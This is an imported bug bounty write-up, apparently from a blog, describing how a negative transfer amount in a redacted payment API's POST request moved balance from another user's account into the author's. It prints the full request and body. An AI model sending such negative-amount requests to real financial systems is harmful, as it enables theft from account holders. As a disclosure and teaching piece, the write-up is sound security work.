---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-05-02_stealing-money-from-one-account-to-another-account.md
original_filename: 2018-05-02_stealing-money-from-one-account-to-another-account.md
title: Stealing money from one account to another account
category: documents
detected_topics:
- idor
- command-injection
- business-logic
- api-security
tags:
- imported
- documents
- idor
- command-injection
- business-logic
- api-security
language: en
raw_sha256: 94777b86b4f885c360df6c7e15fd0c0d7b25347818f49eb89d1f633d918f4625
text_sha256: 94541a9ee5d2939332e09c2102dd30b260a36edb4ff058340e884aab59f8ba9f
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Stealing money from one account to another account

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-05-02_stealing-money-from-one-account-to-another-account.md
- Source Type: markdown
- Detected Topics: idor, command-injection, business-logic, api-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `94777b86b4f885c360df6c7e15fd0c0d7b25347818f49eb89d1f633d918f4625`
- Text SHA256: `94541a9ee5d2939332e09c2102dd30b260a36edb4ff058340e884aab59f8ba9f`


## Content

---
title: "Stealing money from one account to another account"
url: "https://medium.com/@evilboyajay/stealing-money-from-one-account-to-another-account-d7c5ee68922b"
authors: ["Ajay Gautam (@evilboyajay)"]
bugs: ["Logic flaw"]
publication_date: "2018-05-02"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5891
scraped_via: "browseros"
---

# Stealing money from one account to another account

Stealing money from one account to another account
Ajay Gautam
Follow
1 min read
·
May 2, 2018

263

While my recon on one of the bug bounty website, i found a subdomain which consists of sensitive information as well as others too but here i am going to share the most interesting bug i found when further testing.

While i was digging and digging i found a end point to send the money from one account to another account. I was not going to test :P, trying to send money from one account to another account. I thought it will be impossible but still let’s give a damn try and tried idor and other methods and failed :) .

So what ?

Let’s think out of the box

Now i tried to send money to another account by adding (-) sign in the amount and the request was like below

Get Ajay Gautam’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Request

POST https://api.redacted.com/api/transaction/transfer

Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Content-Length: 96
content-type: application/json
Host: api.redacted.com
Origin: https://redacted.com
Referer: https://redacted.com/site/wallet
Request Body

{
“addressTo”: “evilboyajay”,
“amount”: “-100”,
“userFromId”: 1925
}

And guess what happen?

It loaded balance to my account(i.e id1925) but in account (evilboyajay) balance got deducted with the amount i supplied. Little, tricky but it was awesome finding this bug.

In this way, i was able to steal balance from other’s account to mine.
